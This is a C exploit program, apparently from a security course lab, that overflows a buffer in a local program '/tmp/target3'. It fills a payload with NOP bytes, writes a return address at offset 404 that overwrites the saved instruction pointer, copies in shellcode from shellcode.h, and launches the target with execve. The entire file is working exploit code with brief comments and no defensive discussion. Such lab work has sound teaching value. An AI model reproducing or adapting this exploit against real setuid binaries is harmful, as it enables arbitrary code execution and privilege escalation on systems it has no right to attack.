#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/tmp/target3"

char payload[65935];

int main(void) {
  // push in nops to the payload
  memset(payload, 0x90, 65935);

 // buffer starts at 0x bf fc fb 30
 // ebp starts at 0x bf fe fc c0 (location 400, starting at 0 in payload)
 // eip starts at c4, and point it to starting of buffer
  payload[404] = 0x30;
  payload[405] = 0xfb;
  payload[406] = 0xfe;
  payload[407] = 0xbf;

 // push shellcode at the beginning of buffer
  strcpy(payload, shellcode);
  payload[45] = 0x90;

  char *args[] = { TARGET, payload, "65935", NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
